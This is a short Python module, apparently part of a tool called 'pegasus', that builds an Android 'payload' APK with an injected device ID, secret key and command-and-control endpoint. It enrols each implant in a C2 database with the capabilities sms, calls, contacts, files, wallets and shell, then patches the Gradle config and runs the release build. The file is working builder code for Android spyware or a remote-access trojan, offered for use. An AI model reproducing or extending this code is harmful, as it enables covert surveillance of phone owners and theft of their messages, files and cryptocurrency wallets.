"""APK build with DNA, key and endpoint injected. Idempotent injection."""
import pathlib
import re
import secrets
import shutil
import subprocess

from ..c2 import dna as dna_db
from pegasus.core.config import lan_ip

GRADLE = pathlib.Path("agent-android/app/build.gradle")
FIELD = re.compile(r"\n\s*buildConfigField \"String\", \"(DNA|KEY|ENDPOINT)\".*")


def build_payload(serial: str, dna: str, out: str) -> str:
    key = secrets.token_hex(32)
    dna_db.enrol(dna, serial, key, ["sms", "calls", "contacts", "files", "wallets", "shell"])
    endpoint = f"http://{lan_ip()}:{_c2_port()}"
    src = FIELD.sub("", GRADLE.read_text())
    block = ('defaultConfig {\n'
             f'        buildConfigField "String", "DNA", \'"{dna}"\'\n'
             f'        buildConfigField "String", "KEY", \'"{key}"\'\n'
             f'        buildConfigField "String", "ENDPOINT", \'"{endpoint}"\'')
    GRADLE.write_text(src.replace("defaultConfig {", block, 1))
    subprocess.run(["./gradlew", "assembleRelease"], cwd="agent-android", check=True,
                   timeout=900, capture_output=True)
    apk = pathlib.Path("agent-android/app/build/outputs/apk/release/app-release.apk")
    pathlib.Path(out).parent.mkdir(parents=True, exist_ok=True)
    shutil.copy(apk, out)
    return out


def _c2_port() -> int:
    import os
    return int(os.environ.get("PEGASUS_C2_PORT", "5002"))
